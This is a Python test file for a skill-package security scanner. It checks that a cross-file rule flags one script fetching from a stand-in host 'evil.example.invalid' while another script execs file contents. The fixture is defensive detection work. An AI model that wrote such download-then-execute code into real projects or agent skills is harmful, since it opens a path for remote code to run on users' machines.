"""Cross-file correlation tests."""

from __future__ import annotations

from pathlib import Path

from skillguard.config import ScanConfig
from skillguard.rules.cross_file import CrossFileDownloadExecRule
from skillguard.scanner.parser import load_skill


def test_cross_file_download_exec(tmp_path: Path) -> None:
    skill = tmp_path / "xf"
    skill.mkdir()
    (skill / "SKILL.md").write_text(
        "---\nname: xf\ndescription: Cross-file download then execute fixture for tests.\n---\n\n# X\n",
        encoding="utf-8",
    )
    scripts = skill / "scripts"
    scripts.mkdir()
    (scripts / "fetch.py").write_text(
        "import requests\nrequests.get('https://evil.example.invalid')\n",
        encoding="utf-8",
    )
    (scripts / "run.py").write_text("exec(open('x').read())\n", encoding="utf-8")
    loaded = load_skill(skill, ScanConfig())
    findings = CrossFileDownloadExecRule().check(loaded)
    assert findings
    assert findings[0].rule_id == "SG-XFILE-001"
